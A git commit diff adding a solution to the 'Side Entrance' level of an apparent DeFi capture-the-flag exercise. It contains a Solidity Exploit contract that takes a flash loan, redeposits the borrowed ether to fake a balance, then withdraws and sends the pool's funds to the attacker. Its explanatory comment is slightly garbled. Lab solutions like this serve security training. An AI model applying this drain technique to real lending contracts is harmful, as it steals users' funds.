3448c5496a1d6f4f4b6d951f4650c97ce337d1c1
andrejscek <scek.andrej@gmail.com>
2023-08-21 09:49:40 +0200

    solution to 4 - SideEntrance

--- test/Levels/side-entrance/SideEntrance.t.sol
+++ test/Levels/side-entrance/SideEntrance.t.sol
@@ -3,8 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
-
-import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -36,7 +35,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        Exploit exploit = new Exploit(address(sideEntranceLenderPool));
+        exploit.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -48,4 +50,36 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+
+
+/* @dev: to explot, we will:
+    1. initiate flashLoan for the total amount of the pool
+    2. using our own execute function, use the borrowed amount to deposit the balance of the borrowed amount from the flash loan
+    3. since we deposited the balance of the flash loan, our balance before is no
+    3. withdraw the balance from the pool to the contract
+    4. withdraw the balance from the contract to the attacker
+*/
+contract Exploit is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool private pool;
+    address payable private owner;
+    uint256 private amount;
+
+    constructor(address _pool) {
+        owner = payable(msg.sender);
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    function attack() external {
+        amount = address(pool).balance;
+        pool.flashLoan(amount);
+        pool.withdraw();
+    }
+
+    function execute() external payable {
+        pool.deposit{value: amount}();
+    }
+
+    receive() external payable {owner.transfer(amount);}
 }
